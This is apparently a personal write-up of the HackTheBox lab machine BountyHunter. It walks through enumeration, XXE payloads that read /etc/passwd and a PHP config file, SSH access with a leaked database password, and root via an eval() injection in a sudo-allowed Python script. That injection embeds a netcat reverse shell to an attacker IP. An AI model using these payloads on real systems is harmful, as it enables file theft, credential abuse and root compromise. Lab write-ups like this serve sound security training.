Tags: #Linux/Ubuntu #Easy #Apache #PHP #XXE #Source-Code-Analysis/Local-script #Python 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.100
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```
<br>
<br>

# **Service Enumeration**
Initial nmap scan shows there are 2 ports open, port 22 running SSH and port 80 running an Apache web server. Taking a look at the web page, we see a site about a group of bug bounty hunters for hire:

![[Pasted image 20250208131032.png]]

From a quick glance, the "Portal" page looks interesting, but before we go further, I'm going to run `feroxbuster` in the background to find hidden directories. 

The script found an interesting file called `/resources/README.txt`, let's take a look:

![[Pasted image 20250209133803.png]]

We found a potential user "test" on their portal, so I'll head over there now:

![[Pasted image 20250208131320.png]]

Unfortunately it seems to be under development, so that account we found earlier might not be useful, but we can test their bounty tracker. 

From the URL, we discover that this site is running PHP, so we can run another `feroxbuster` scan in the background to find hidden PHP pages using the `-x php` flag. Our command looks like this:

`feroxbuster -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php
`

The scan returned a 200 status code on `db.php`, Upon navigating there in my browser, I just get a blank page, so we'll move on.

Let's take a look at the bug bounty tracker page:

![[Pasted image 20250208131501.png]]

I'm going to see how the web page reacts when I fill these fields with random data. Here's the output:

![[Pasted image 20250208131838.png]]

The back-end formats our input somehow to display this output. I'm going to launch burpsuite for further analysis.

![[Pasted image 20250208132503.png]]

There's a single parameter "data" whose value is set to what we entered, but base64 encoded and URL encoded. I want to see exactly how this data is formatted for the server so we'll decode it. Here's what we see:

![[Pasted image 20250208132720.png]]

So the web page formats our data into XML and then sends it over. There's a good chance of there being an **XML External Entity vulnerability** (XXE) here. 

To test this, we'll tweak the base64 decoded output to define an XML entity, set it to a PHP stream wrapper that grabs a file like "/etc/passwd", encode it with base64, and have it print its contents in the `<reward>` tag:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
		<bugreport>
		<title>asdffasd</title>
		<cwe>asdfasdf</cwe>
		<cvss>asfdasdf</cvss>
		<reward>&file;</reward>
		</bugreport>
```

Encoding the file is important because the XML parser processes its contents as if it were XML, and if it includes special characters like <, >, and more, it can potentially throw errors and not return anything. 

Now we base64 encode and URL encode our payload, and send it through:

![[Pasted image 20250209001217.png]]

Looks successful! We have confirmed that there is an XXE vulnerability and can proceed to obtain more sensitive files or do something else with it
<br>
<br>
# **Exploitation**
## **Initial Access**
Earlier, we found `db.php` but it didn't return anything when we fetched the page. Maybe we can pull the file and find sensitive info in its source code. Let's change the `resource` parameter accordingly:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>asdffasd</title>
		<cwe>asdfasdf</cwe>
		<cvss>asfdasdf</cvss>
		<reward>&file;</reward>
		</bugreport>
```

Upon submission, the server returned our file:

![[Pasted image 20250209142718.png]]

On the right, burpsuite decoded it and we found some valuable credentials:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```

Earlier, we were also able to obtain the /etc/passwd file, which tells us which users exist on the system. After pulling that file again and decoding the output, we found 2 users we could login as, root and development. We can try to SSH into the box as development with admin's DB password:

![[Pasted image 20250209152336.png]]

I'm now logged in as development. Time to escalate privileges.
<br>
<br>
# **Privilege Escalation**  
In development's home directory, there's a file named "contract.txt", and it reads the following:

```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Two ways I can think of John setting our permissions for the tool are by giving it a setuid bit or by specifying in the sudoers file that we are allowed execute that script using sudo. The output of `sudo -l` confirms the latter:

```
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

We need to analyze ticketValidator.py to see if any part of it can be exploited. Here's the source code:

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True 
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

This script expects a .md file, runs a few checks to ensure it's a valid ticket, and if they all pass, it looks for a string enclosed within matching "\*\*" and passes it inside the eval() function. This is the key line that allows us to exploit this script. Since we have root permissions when executing this script, the python process also has root permissions, and the eval() function allows us to execute python expressions without any restriction, meaning we can execute python code as root. 

The checks that the script performs are the following
1. The file is a .md file
2. The 1st line has to start with `# Skytrain Inc`
3. The 2nd line has to start with `## Ticket to `
4.  The 3rd line has to start with `__Ticket Code:__`
5. The first number in the expression within the matching "\*\*" has to be a number that has a remainder of 4 when divided by 7
6. The result of the mathematical calculation has to be greater than 100

For our payload to execute, we must write a file that passes at least the first 5 checks, since the 6th one comes after the eval() function. 

So here's what our ticket.md file should look like:

```
# Skytrain Inc
## Ticket to New York
__Ticket Code:__
**11+89+432+__import__("os").system("busybox nc 10.10.14.9 9001 -e sh")**
```

We can't use the `import` keyword because that's a statement, not an expression, while `__import__` is, and "adding" it to the previous numbers is valid because all of that code eventually returns a status code, which is an integer. 

Now we save this file to /dev/shm on the target machine, run the script using sudo, and make sure our listener is set up:

![[Pasted image 20250209174337.png]]

And now we're root!
<br>
<br>
# Skills Learned
* Using the -x flag in `feroxbuster` with wordlists like `raft-small-words` or its medium version in seclists is useful for when you know the target site is using a particular framework and ==you want to enumerate files associated with it==. For example, if the site is running PHP, you can scan for .php scripts by passing `-x php` and find valuable info
* XML External Entity (XXE) 
	* **ELABORATE MORE ON THIS**
* The `__import__()` function in python is useful for importing modules when the usual `import` keyword is disallowed or doesn't work for some other reason. For example, if you want to import the `os` module and call the `system` method, you would run `__import__('os').system("<command to run>")`
<br>
<br>
# Proof of Pwn
Paste link to HTB Pwn notification after owning root